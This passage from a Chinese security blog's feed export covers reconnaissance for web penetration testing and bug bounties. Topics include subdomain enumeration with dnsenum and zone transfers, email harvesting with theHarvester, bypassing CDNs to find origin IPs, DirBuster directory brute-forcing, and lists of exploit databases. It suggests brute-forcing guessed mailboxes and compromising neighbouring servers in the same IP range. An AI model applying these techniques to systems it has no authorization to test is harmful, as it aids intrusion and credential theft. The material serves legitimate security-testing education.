class="heading-link"><i class="fas fa-link"></i></a>2.2.2. 管理功能测试</h3>      <p>按照工作流分别对任务管理，报表管理，分布式管理功能按照测试表逐项测试。</p>        <h3 id="2-2-3-可靠性测试">          <a href="#2-2-3-可靠性测试" class="heading-link"><i class="fas fa-link"></i></a>2.2.3. 可靠性测试</h3>      <ol><li>断电恢复测试：扫描过程突然断电，查看扫描引擎是否能够对任务信息，扫描过程信息，关键配置信息，模板信息等进行备份或保存。</li><li>断点续扫测试：扫描任务暂停或意外中断后再恢复，查看任务是否正常。</li></ol>        <h2 id="2-3-测试结果">          <a href="#2-3-测试结果" class="heading-link"><i class="fas fa-link"></i></a>2.3. 测试结果</h2>              <h3 id="2-3-1-扫描功能和相关测试性能">          <a href="#2-3-1-扫描功能和相关测试性能" class="heading-link"><i class="fas fa-link"></i></a>2.3.1. 扫描功能和相关测试性能</h3>              <h3 id="2-3-2-管理功能测试">          <a href="#2-3-2-管理功能测试" class="heading-link"><i class="fas fa-link"></i></a>2.3.2. 管理功能测试</h3>              <h3 id="2-3-3-可靠性测试">          <a href="#2-3-3-可靠性测试" class="heading-link"><i class="fas fa-link"></i></a>2.3.3. 可靠性测试</h3>              <h2 id="2-4-相关扫描软件测试评估">          <a href="#2-4-相关扫描软件测试评估" class="heading-link"><i class="fas fa-link"></i></a>2.4. 相关扫描软件测试评估</h2>      <p>国外软件：<span class="exturl"><a class="exturl__link" href="http://sectoolmarket.com/wivet-score-unified-list.html%EF%BC%88%E4%B8%8D%E4%B8%80%E5%AE%9A%E5%BE%88%E5%87%86%E7%A1%AE%EF%BC%89">http://sectoolmarket.com/wivet-score-unified-list.html（不一定很准确）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="2020/07/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2020/07/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-1-第一步：域名探测">          <a href="#1-1-第一步：域名探测" class="heading-link"><i class="fas fa-link"></i></a>1.1. 第一步：域名探测</h2>      <p>当我们对一个站点进行渗透探测之前，一般渗透测试人员直接通过漏洞扫描器对指定目标站点进行渗透，当指定目标站点无漏洞时，渗透测试人员就需要进行信息收集工作来完成后期的渗透。</p><p>目前一般域名漏洞扫描工具  ：AWVS，APPSCAN，Netspark，Webinspect，Nmap，Nessus，天镜，明鉴，WVSS，RSAS，等。</p><a id="more"></a>        <h2 id="1-2-第二步：子域名探测">          <a href="#1-2-第二步：子域名探测" class="heading-link"><i class="fas fa-link"></i></a>1.2. 第二步：子域名探测</h2>      <p>工具例如：Layer子域名挖掘机，Sublist3r，subDomainsBrute</p><p>根据主域名，可以获得二级域名，三级域名，。。。主要姿势可以有：</p>        <h3 id="1-2-1-DNS域-传送漏洞">          <a href="#1-2-1-DNS域-传送漏洞" class="heading-link"><i class="fas fa-link"></i></a>1.2.1. DNS域 传送漏洞</h3>      <p>如果存在，不仅能搜索到子域名，还能轻松找到一个枚举，这样的好事百试不厌；如果 SRC 一级域名不多，直接在 kali 下 dnsenum + 域名（比如说：dnsenum oldboy.com -f /dns.txt –dnsserver 114.114.114.114 )</p><p><strong>工具说明及用法可参考如下:</strong></p><p>dnsenum的目的是尽可能收集一个域的信息，它能够通过谷歌或者字典文件猜测可能存在的域名，以及对一个网段进行反向查询。它可以查询网站的主机地址信息。域名服务器、mxrecord (函件交换记录)，在域名服务器上执行axfr请求，通过谷歌脚本得到扩展城名信息google hacking),提取自域名并查询，计算C类地址并执行whois查询，执行反向查询，把地址段写入文件。</p><p><strong>参数说明:</strong></p><ol><li>-h：查看工具使用帮助</li><li>–dnsserver <server> ：指定域名服务器</server></li><li>–enum ：快捷选项，相当于”-threads -s 15 -w”</li><li>–noreverse ：跳过反向查询操作</li><li>–nocolor ：无彩色输出</li><li>–private ：显示并在”domain_ips.txt”文件结尾保存私有的ips</li><li>–subfile <file> ：写入所有有效的子域名到指定文件</file></li><li>–t，–timeout <value> ：tcp或者udp的连接超时时间。默认为10s (时间单位:秒)。</value></li><li>–threads <vaue> ：查询线程数</vaue></li><li>-v，–verbose ：显示所有的进度和错误消息</li><li>-o，–output <file> ：输出选项，将输出信息保存到指定文件。</file></li><li>-e，–exclude <regexp> ：反向查询选项，从反向查询结果中排除与正则表达式相符的PTR 记录，在排查无效主机上非常有用。</regexp></li><li>-w，–whois ：在一个C段网络地址范围提供whois查询</li><li>-f dns.txt ：指定字典文件，可以换成dns-big.txt也可以自定义字典</li></ol><p>相关解析记录说明可参考：<span class="exturl"><a class="exturl__link" href="https://wenku.baidu.com/view/d2d597b669dc5022aaea0030.html">https://wenku.baidu.com/view/d2d597b669dc5022aaea0030.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="1-2-2-备案号查询">          <a href="#1-2-2-备案号查询" class="heading-link"><i class="fas fa-link"></i></a>1.2.2.备案号查询</h3>      <p>这算是奇招吧，通过查询系统域名备案号，再反查备案号相关的域名，收获颇丰。</p><p>ICP 备案查询网：<span class="exturl"><a class="exturl__link" href="http://www.beianbeian.com/">http://www.beianbeian.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>天眼查：<span class="exturl"><a class="exturl__link" href="http://www.tianyancha.com/">http://www.tianyancha.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="1-2-3-SSL-证书">          <a href="#1-2-3-SSL-证书" class="heading-link"><i class="fas fa-link"></i></a>1.2.3. SSL 证书</h3>      <p>通过查询 SSL 证书（现在很多网站都是 https），获取的域名存活率很高，这应该也是不错的思路。</p><p>查询网址：<span class="exturl"><a class="exturl__link" href="https://myssl.com/ssl.html">https://myssl.com/ssl.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> </p><p>或者 <span class="exturl"><a class="exturl__link" href="https://www.chinassl.net/ssltools/ssl-checker.html">https://www.chinassl.net/ssltools/ssl-checker.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="1-2-4-Google-搜索-C-段">          <a href="#1-2-4-Google-搜索-C-段" class="heading-link"><i class="fas fa-link"></i></a>1.2.4. Google 搜索 C 段</h3>      <p>这招比较少，国内 Google 没法用，国内的用 bin 或者 百度 都可以，在没有什么进展的情况下或许会有惊喜。（比如说，网站被挂码了）</p><p>方法一：参照 Google hacking 的方法</p><p>方法二：用 k8 工具，前提条件是要注册 bing（必应） 接口。（k8_C段旁注工具）</p><p>什么是C段:比如在：127.127.127.4这个IP上面有一个网站127.4 这个服务器上面有网站，我们可以想想，他是一个非常大的站几乎没什么漏洞，但是在他同C段 127.127.127.1<del>127.127.127.255这1</del>255上面也有服务器而且也有网站并且存在漏洞,那么我们就可以来渗透1~255 任何一个站之后提权来嗅探得到127.4这台服务器的密码甚至3389连接的密码后台登录的密码如果运气好会得到很多的密码。</p>        <h3 id="1-2-5-APP-提取">          <a href="#1-2-5-APP-提取" class="heading-link"><i class="fas fa-link"></i></a>1.2.5. APP 提取</h3>      <p>反编译APP进行提取相关IP地址，此外在APP上挖洞的时候，可以发现前面招式找不到的域名，在APP里面有大量的接口IP和内网IP, 同时可获取不少安全漏洞。（其实 app 的漏洞比 web 多一些）</p><p>Andriod Killer，当网站有app，然后把app下载下来，进行反编译分析，就会有一系列IP</p>        <h3 id="1-2-6-微信公众号">          <a href="#1-2-6-微信公众号" class="heading-link"><i class="fas fa-link"></i></a>1.2.6. 微信公众号</h3>      <p>企业的另一通道，渗透相关公众号，绝对会有意外收获，：不少漏洞+域名，有关 Burp 抓取 app</p>        <h3 id="1-2-7-字典枚举法">          <a href="#1-2-7-字典枚举法" class="heading-link"><i class="fas fa-link"></i></a>1.2.7. 字典枚举法</h3>      <p>字典枚举法是一种传统的查找子域名的技术，这类技术涉及的工具有：DNSReconcile，Layer 子域名挖掘机，DirBuster，Demon二级域名爆破</p>        <h3 id="1-2-8-公开-DNS-源">          <a href="#1-2-8-公开-DNS-源" class="heading-link"><i class="fas fa-link"></i></a>1.2.8. 公开 DNS 源</h3>      <p>Rapid 7 下 Sonor 项目发布的：<span class="exturl"><a class="exturl__link" href="https://scans.io/study/sonar.fdns_v2">https://scans.io/study/sonar.fdns_v2</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>DNS 历史解析： <span class="exturl"><a class="exturl__link" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="1-2-9-威胁情报查询">          <a href="#1-2-9-威胁情报查询" class="heading-link"><i class="fas fa-link"></i></a>1.2.9. 威胁情报查询</h3>      <p>华为安全情报：<span class="exturl"><a class="exturl__link" href="https://isecurity.huawei.com/">https://isecurity.huawei.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="1-2-10-子域名枚举">          <a href="#1-2-10-子域名枚举" class="heading-link"><i class="fas fa-link"></i></a>1.2.10 子域名枚举</h3>      <p>子域名爆破网站：<span class="exturl"><a class="exturl__link" href="https://phpinfo.me/domain">https://phpinfo.me/domain</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>IP反查绑定域名网站：<span class="exturl"><a class="exturl__link" href="http://dns.aizhan.com/">http://dns.aizhan.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="1-2-11-证书透明度公开日志枚举">          <a href="#1-2-11-证书透明度公开日志枚举" class="heading-link"><i class="fas fa-link"></i></a>1.2.11 证书透明度公开日志枚举</h3>      <p>证书透明度是证书授权机构（CA）的一个项目，证书授权机构会将每个SSL/TLS证书发布到公共日志中，一个SSL/TLS证书通常包含域名，子域名和邮件地址，这些也经常成为攻击者非常希望获得的有用信息。</p><p>搜索：<span class="exturl"><a class="exturl__link" href="https://crt.sh/">https://crt.sh</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>或者：<span class="exturl"><a class="exturl__link" href="https://censys.io/">https://censys.io</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h2 id="1-3-敏感信息收集">          <a href="#1-3-敏感信息收集" class="heading-link"><i class="fas fa-link"></i></a>1.3. 敏感信息收集</h2>              <h3 id="1-3-1-web源代码泄露">          <a href="#1-3-1-web源代码泄露" class="heading-link"><i class="fas fa-link"></i></a>1.3.1. web源代码泄露</h3>      <p>通过相关工具暴力破解相关 Web 源码。</p><p>最强调的是 GitHub 信息泄露了，直接取GitHub 上搜索，可能有人不自信认为自己没有能力去 SRC 挖洞。</p><p>信息泄露收集可能会用到以下地址：</p><ol><li>网盘搜索：<span class="exturl"><a class="exturl__link" href="http://www.pansou.com/">http://www.pansou.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>网盘密码破解可参考：<span class="exturl"><a class="exturl__link" href="https://www.52pojie.cn/thread-763130-1-1.html">https://www.52pojie.cn/thread-763130-1-1.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>社工信息泄露：<span class="exturl"><a class="exturl__link" href="https://www.instantcheckmate.com/">https://www.instantcheckmate.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>源码搜索：<span class="exturl"><a class="exturl__link" href="https://searchcode.com,https//gitee.com%EF%BC%8Chttps://gitcafe.com%EF%BC%8Chttps://code.csdn.net">https://searchcode.com，https://gitee.com，https://gitcafe.com，https://code.csdn.net</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>钟馗之眼：<span class="exturl"><a class="exturl__link" href="https://www/zoomeye.org">https://www/zoomeye.org</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>天眼查：<span class="exturl"><a class="exturl__link" href="https://www.tianyancha.com/">https://www.tianyancha.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>其他：威胁情报，微步在线，ti.360.cn，Virustotal</li></ol>        <h3 id="1-3-2-邮箱信息收集">          <a href="#1-3-2-邮箱信息收集" class="heading-link"><i class="fas fa-link"></i></a>1.3.2. 邮箱信息收集</h3>      <p>收集邮箱信息主要有两个作用: </p><ol><li>通过发现目标系统账号的命名规律，可以用来后期登入其他子系统。</li><li>爆破登入邮箱用。</li></ol><p>通常，邮箱的账号有如下几种生成规律:比如某公司有员工名叫做“张小三”，它的邮箱可能如下:<br><span class="exturl"><a class="exturl__link" href="mailto:&#x7a;&#104;&#x61;&#x6e;&#x67;&#x78;&#x69;&#97;&#111;&#115;&#x61;&#x6e;&#64;&#x78;&#x6f;&#x78;&#46;&#x63;&#111;&#109;">&#x7a;&#104;&#x61;&#x6e;&#x67;&#x78;&#x69;&#97;&#111;&#115;&#x61;&#x6e;&#64;&#x78;&#x6f;&#x78;&#46;&#x63;&#111;&#109;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>     <span class="exturl"><a class="exturl__link" href="mailto:&#x78;&#105;&#x61;&#111;&#115;&#97;&#110;&#x2e;&#x7a;&#104;&#97;&#110;&#103;&#64;&#111;&#x78;&#46;&#99;&#x6f;&#109;">&#x78;&#105;&#x61;&#111;&#115;&#97;&#110;&#x2e;&#x7a;&#104;&#97;&#110;&#103;&#64;&#111;&#x78;&#46;&#99;&#x6f;&#109;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>    <span class="exturl"><a class="exturl__link" href="mailto:&#x7a;&#x78;&#x69;&#97;&#111;&#115;&#97;&#x6e;&#64;&#x78;&#x78;&#x2e;&#99;&#x6f;&#109;">&#x7a;&#x78;&#x69;&#97;&#111;&#115;&#97;&#x6e;&#64;&#x78;&#x78;&#x2e;&#99;&#x6f;&#109;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>当我们收集几个邮箱之后，便会大致猜出对方邮箱的命名规律。除了员工的邮箱之外，通过公司会有一些共有的邮箱，比如人力的邮箱、客服的邮箱，<span class="exturl"><a class="exturl__link" href="mailto:&#104;&#x72;&#64;&#120;&#120;&#x2e;&#x63;&#111;&#109;">&#104;&#x72;&#64;&#120;&#120;&#x2e;&#x63;&#111;&#109;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>/kefu@xx.com 这种邮箱有时会存在弱口令，在渗透时可额外留意下， 我们可以通过手工或者工具的方式来确定搜索邮箱。</p><p><strong>手工方式：</strong></p><ol><li>可以到百度等搜索引擎上搜索邮箱信息</li><li>GitHub 等第三方托管平台，例如数据库连接信息，邮箱密码，uc-key，阿里的osskey</li><li>社工库</li></ol><p><strong>工具方式：</strong></p><p>在邮箱收集领域不得不提一个工具：The Harvester，The Harvester 可用于搜索Google，Bing 和 PGP 服务器的电子邮件. 主机 . 子域名，因此需要翻墙运用此工具。工具下载地址：<span class="exturl"><a class="exturl__link" href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><strong>注：</strong></p><p>python -m pip install -r requirements.txt  导入相关配置，python3.7版本（其他的可能不行）</p><p>使用方法很简单：./theHarvester.py -d 域名 -l 1000 -b all（-l 是搜索页数，-b 是指把所有搜索引擎都使用一遍，看哪个可以）</p>        <h3 id="1-3-3-历史漏洞收集">          <a href="#1-3-3-历史漏洞收集" class="heading-link"><i class="fas fa-link"></i></a>1.3.3. 历史漏洞收集</h3>      <p>仔细分析，大胆验证，发散思维，对企业的运维，开发习惯了解绝对是有很大帮助的。可以把漏洞保存下来进行统计。这些漏洞，企业可能没有修复，或者没有修复完整。</p><ol><li>wooyun 历史漏洞库：<span class="exturl"><a class="exturl__link" href="https://www.wooyun.suimugan.com(现在打不开了)/">https://www.wooyun.suimugan.com（现在打不开了）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>漏洞银行：<span class="exturl"><a class="exturl__link" href="https://www.bugbank.cn/">https://www.bugbank.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>360补天：<span class="exturl"><a class="exturl__link" href="https://www.butian.net/">https://www.butian.net/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>教育行业漏洞报告平台(Beta)：<span class="exturl"><a class="exturl__link" href="https://src.edu-info.edu.cn/login/">https://src.edu-info.edu.cn/login/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol>        <h3 id="1-3-4-Burpsuite-的Repeater功能">          <a href="#1-3-4-Burpsuite-的Repeater功能" class="heading-link"><i class="fas fa-link"></i></a>1.3.4 Burpsuite 的Repeater功能</h3>      <p>可以获取一些服务器的信息，例如运行的Server类型与版本，PHP的版本信息。</p>        <h2 id="1-4-指纹识别">          <a href="#1-4-指纹识别" class="heading-link"><i class="fas fa-link"></i></a>1.4. 指纹识别</h2>      <p>这里的指纹讲的是网站CMS指纹识别，计算机操作系统及Web容器的指纹识别。</p><p>渗透测试过程中指纹识别是很有必要的，只有识别出相应的Web容器或者CMS，才能进行相应的渗透操作。</p><p>CMS又称整站系统或者文章系统，开发者只要给客户一个软件包，客户自己安装配置好，就可以定期更新数据来维护网站，节省了大量的人力和物力。</p><p>常见的CMS有：Dedecms(织梦)，Discuz，PHPWEB，PHPWind，PHPCMS，ECShop，Dvbbs，SiteWeaver，ASPCMS，帝国，Z-Blog，WordPress。</p><p>在这个过程可以加入端口扫描，敏感文件扫描之类的操作，用到的工具，如：御剑，whatweb，Wapplyzer，WebRobo，椰树，轻量WEB指纹识别等工具。</p><p>推荐一篇文章：<span class="exturl"><a class="exturl__link" href="https://anquanke.com/post/id/178230/">https://anquanke.com/post/id/178230/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>在线查询CMS指纹识别：</p><p>BugScaner：<span class="exturl"><a class="exturl__link" href="http://whatweb.bugscaner.com/look">http://whatweb.bugscaner.com/look</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>云悉指纹：<span class="exturl"><a class="exturl__link" href="http://ww.yunsee.cn/finger.html">http://ww.yunsee.cn/finger.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>WhatWeb：<span class="exturl"><a class="exturl__link" href="https://whatweb.net/">https://whatweb.net</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h2 id="1-5-查找真实IP">          <a href="#1-5-查找真实IP" class="heading-link"><i class="fas fa-link"></i></a>1.5 查找真实IP</h2>      <p>渗透测试过程中，目标服务器可能只有一个域名，那么如何通过这个域名来确定目标服务器的真实IP对渗透测试来说很重要，如果目标服务器不存在CDN，可以直接通过 <span class="exturl"><a class="exturl__link" href="http://www.ip138.com来获取目标的一些ip以及域名信息./">www.ip138.com来获取目标的一些IP以及域名信息。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>CDN即内容分发网络，主要解决因传输距离和不同运营节点造成的网络速度性能低下的问题。就是一组在不同运营商之间的对接节点上的高速缓存服务器，把用户经常访问的静态数据资源（例如：静态的html，css，js图片等文件）直接缓存到节点服务器上，当用户再次请求时，会直接分发到在离用户的节点的服务上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度和用户体验。</p><p>如果我们要渗透的目标购买了CDN服务，可以直接ping目标的域名，但得到的并非真正目标Web服务器，而只是离我们最近的一台目标节点的CDN服务器。</p>        <h3 id="1-5-1-判断是否用了CDN">          <a href="#1-5-1-判断是否用了CDN" class="heading-link"><i class="fas fa-link"></i></a>1.5.1 判断是否用了CDN</h3>      <p>ping目标域名，观察域名解析情况。</p><p>利用在线网站：<span class="exturl"><a class="exturl__link" href="https://www.17ce.com/">https://www.17ce.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>进行全国多地区的ping服务器操作，然后对比每个地区ping出的IP结果，查看这些IP是否一致，如果一致就很有可能不存在CDN；如果IP大多不一致或者规律性很强，可以尝试查询这些IP的归属地。</p>        <h3 id="1-5-2-绕过CDN寻找真实IP">          <a href="#1-5-2-绕过CDN寻找真实IP" class="heading-link"><i class="fas fa-link"></i></a>1.5.2 绕过CDN寻找真实IP</h3>      <ol><li>内部资源箱，一般的邮件系统都在内部，没有经过CDN解析，通过网站用户注册或者RSS订阅功能，查看邮件，寻找邮件头部中的邮件服务器域名IP，ping这个邮件服务器域名就可以得到真实的IP。</li><li>扫描网站测试文件，如：phpinfo，test等。</li><li>分站域名，很多网站主站的访问量很大，所以主站一般都会挂CDN，但是分站可能不会挂，可以通过ping一个二级域名获取分站IP，可能会有分站和主站不是通过一个IP但是在同一个C段下，从而判断真实IP。</li><li>国外访问，国内的CDN 往往只对国内的用户的访问加速，而国外的CDN就不一定了，通过国外的在线代理网站 App Synthetic Monitor：<span class="exturl"><a class="exturl__link" href="https://asm.ca.com/en/ping.php%EF%BC%8C%E5%8F%AF%E8%83%BD%E4%BC%9A%E5%BE%97%E5%88%B0%E7%9C%9F%E5%AE%9EIP%E3%80%82">https://asm.ca.com/en/ping.php，可能会得到真实IP。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>查询域名的解析记录，也许目标很久以前并没有使用CDN，所以可以通过网站NETCRAFT：<span class="exturl"><a class="exturl__link" href="https://www.netcraft.com/">https://www.netcraft.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 来观察域名的IP历史记录，</li><li>如果目标网站有自己的App，可以尝试利用 Fiddler或者Burpsuite 抓取App的请求，从而找到真实IP</li><li>绕过 CloudFlare CDN 查找真实IP，现在很多网站都使用CloudFlare 提供的CDN服务，在确定了目标网站使用了CDN后，可以尝试通过在线网站CloudFlareWatch：<span class="exturl"><a class="exturl__link" href="http://www.crimeflare.us/cfs.html#box%EF%BC%88%E4%BC%BC%E4%B9%8E%E4%B8%8D%E8%A1%8C%E4%BA%86%EF%BC%89">http://www.crimeflare.us/cfs.html#box（似乎不行了）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol>        <h3 id="1-5-3-验证获取的IP">          <a href="#1-5-3-验证获取的IP" class="heading-link"><i class="fas fa-link"></i></a>1.5.3 验证获取的IP</h3>      <p>直接尝试IP访问，看看响应的页面是不是和访问的域名返回的一样；在目标段很大的时候可以借助类似Masscan的工具批扫描对应IP段中所有开了80，43，8080 端口的IP，然后逐个IP访问。</p>        <h2 id="1-6-收集敏感目录文件">          <a href="#1-6-收集敏感目录文件" class="heading-link"><i class="fas fa-link"></i></a>1.6 收集敏感目录文件</h2>      <p>针对网站目录扫描的工具主要有：DirBuster,御剑，wwwscan，Spinder.py(轻量级快速单文件目录后台扫描)，Sensitivefilescan(轻量级快速单文件目录后台扫描)，Weakfilescan(轻量级快速单文件目录后台扫描)。</p>        <h3 id="1-6-1DirBuster">          <a href="#1-6-1DirBuster" class="heading-link"><i class="fas fa-link"></i></a>1.6.1DirBuster</h3>      <p>Target URL输入框输入要扫描的网址，扫描时将请求方法设置为“Auto Switch(HEAD and GET)”选项。</p><p>设置线程数值：20-30之间，过大时容易引起系统死机。</p><p>选择扫描类型，如果使用个人字典，则选择“List based brute force“选项</p><p>单击”Browse“选择字典</p><p>在 Select starting options 中选择”URL Fuzz“方式进行扫描，设置fuzzing时需要注意，在URL to fuzz里输入”/{dir}“，这里的dir是一个变量，用来代表字典中的每一行。</p><p>如果要扫描的目标是：<span class="exturl"><a class="exturl__link" href="http://www.xxx.com/admin/%EF%BC%8C%E5%B0%B1%E8%A6%81%E5%9C%A8URL">http://www.xxx.com/admin/，就要在URL</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to fuzz里填写”/admin/{dir}“，意思是在”{dir}“的前后可以随意拼接你想要的目录或者后缀，例如输入：”:/admin/{dir}.php“就表示扫描admin目录下的所有PHP文件。</p><p>在线工具：WebScan：<span class="exturl"><a class="exturl__link" href="http://www.webscan.cc/">http://www.webscan.cc/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h2 id="1-7-资产梳理">          <a href="#1-7-资产梳理" class="heading-link"><i class="fas fa-link"></i></a>1.7. 资产梳理</h2>      <p>有了庞大的域名，接下来就是帮助SRC梳理资产了。城名可以先判断存活，活着的维续进行确定IP环节。根据IP的分布，确定企业的公网网段。这其实是一项不小的工程， 精准度比较难以拿捏。不过通过不断实战，肯定可以琢磨出一些东西，所以有人称白帽子可能会比企业的运维更了解资产信息。资产梳理过程中可能需要对相关资产漏洞进行查询、利用、发布等，可能会用到已下相关链接地址:</p>        <h3 id="1-7-1-SRC众测平台">          <a href="#1-7-1-SRC众测平台" class="heading-link"><i class="fas fa-link"></i></a>1.7.1.SRC众测平台</h3>      <ol><li>国际漏洞提交平台：<span class="exturl"><a class="exturl__link" href="https://www/hackerone.com/">https://www/hackerone.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>BugX 区块链漏洞平台：<span class="exturl"><a class="exturl__link" href="http://www.bugx.org/">http://www.bugx.org/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>Gsrc 瓜子 src ：<span class="exturl"><a class="exturl__link" href="https://security.guazi.com/">https://security.guazi.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>区块链安全相应中心：<span class="exturl"><a class="exturl__link" href="https://dvpnet.io/">https://dvpnet.io/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>CNVD 国家信息安全漏洞平台：<span class="exturl"><a class="exturl__link" href="http://www.cnvd.org.cn/">http://www.cnvd.org.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>漏洞银行：<span class="exturl"><a class="exturl__link" href="https://www.bugbank.cn/">https://www.bugbank.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>360 补天：<span class="exturl"><a class="exturl__link" href="https://www.butain.net/">https://www.butain.net/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> </li><li>教育行业漏洞报告平台(Beta)：<span class="exturl"><a class="exturl__link" href="https://src.edu-info.edu.cn/login/">https://src.edu-info.edu.cn/login/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol>        <h3 id="1-7-2-国内平台">          <a href="#1-7-2-国内平台" class="heading-link"><i class="fas fa-link"></i></a>1.7.2.国内平台</h3>      <ol><li>知道创宇 Seebug 漏洞平台：<span class="exturl"><a class="exturl__link" href="https://www.seebug.org/">https://www.seebug.org/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>工控系统行业漏洞平台：<span class="exturl"><a class="exturl__link" href="http://ivd.winicssec.com/">http://ivd.winicssec.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>打造中文最大 exploit 库：<span class="exturl"><a class="exturl__link" href="http://www.expku.com/">http://www.expku.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>为数不多的漏洞管理插件收集平台：<span class="exturl"><a class="exturl__link" href="http://www.bugscan.net/source/template/vulns/">http://www.bugscan.net/source/template/vulns/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>一家管理漏洞收集平台：<span class="exturl"><a class="exturl__link" href="http://www.0daybank.org/">http://www.0daybank.org/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol>        <h3 id="1-7-3-国外平台">          <a href="#1-7-3-国外平台" class="heading-link"><i class="fas fa-link"></i></a>1.7.3.国外平台</h3>      <ol><li>国际漏洞提交平台：<span class="exturl"><a class="exturl__link" href="https://www.hackerone.com/">https://www.hackerone.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>xss poc ：<span class="exturl"><a class="exturl__link" href="http://xssor.io/">http://xssor.io/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>0day 漏洞库：<span class="exturl"><a class="exturl__link" href="https://www.0day.today/">https://www.0day.today/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>路由器漏洞库：<span class="exturl"><a class="exturl__link" href="http://routerpwn.com/">http://routerpwn.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>cve 漏洞平台：<span class="exturl"><a class="exturl__link" href="http://cve.mitre.org/">http://cve.mitre.org/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol>        <h3 id="1-7-4-威胁情报">          <a href="#1-7-4-威胁情报" class="heading-link"><i class="fas fa-link"></i></a>1.7.4.威胁情报</h3>      <ol><li>安全数据交流平台：<span class="exturl"><a class="exturl__link" href="https://www.secsilo.com/">https://www.secsilo.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>华为安全情报：<span class="exturl"><a class="exturl__link" href="https://isecurity.huawei.com/sec/web//intelligencePortal.do">https://isecurity.huawei.com/sec/web//intelligencePortal.do</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>威胁情报共享平台：<span class="exturl"><a class="exturl__link" href="https://www.threatcrowd.org/">https://www.threatcrowd.org/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>被黑站点统计：<span 